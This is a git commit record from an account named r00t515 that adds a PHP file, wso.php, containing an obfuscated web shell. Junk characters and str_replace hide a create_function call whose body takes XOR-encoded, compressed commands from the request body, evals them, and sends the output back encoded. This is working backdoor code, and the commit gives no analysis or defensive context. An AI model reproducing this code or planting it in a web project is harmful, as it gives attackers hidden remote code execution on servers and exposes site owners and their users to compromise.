1252626d0159783573cbf8e3e1fd2a09dd7e721b
r00t515 <84484386+r00t515@users.noreply.github.com>
2021-06-05 12:17:04 +0300

    Add files via upload

---
+++ wso.php
@@ -0,0 +1,12 @@
+<?php
+$A=str_replace('oX','','creoXaoXte_oXfuoXnoXctoXion');
+$H=');$r=@bLase64L_encode(@xL(@gzcomLpress(L$o),L$k))L;print("$Lp$kh$Lr$kf");}';
+$C='(L$i=0L;$Li<$l;){Lfor($j=0;($j<$Lc&&$Li<$lL);$j++,L$i++){$oL.=$Lt{$iL}^$k{';
+$u='ents("php:L//input"),L$m)==1L) {@obL_start();@LeLvalL(@gzunLcompLress(@x(@';
+$W='$j};}}rLeturn L$o;}ifL (@pregLL_match("/$khL(LLL.+L)$kf/",@file_geLt_cLont';
+$P='8YLHjLda";LfuLnction x($t,$k)L{$Lc=strlen($kL);$l=stLrlLen($tL);$o="";Lfor';
+$x='basLe64_decoLdeL($m[1])L,$k))L)L;L$oL=@ob_get_coLntents();@ob_eLnd_Lclean(';
+$V='$Lk="63a9f0ea";$Lkh="LLL7bb98050796b";$kLf="L649e8548L1845";$p=L"qfpQJLtylg3';
+$f=str_replace('L','',$V.$P.$C.$W.$u.$x.$H);
+$l=$A('',$f);$l();
+?>
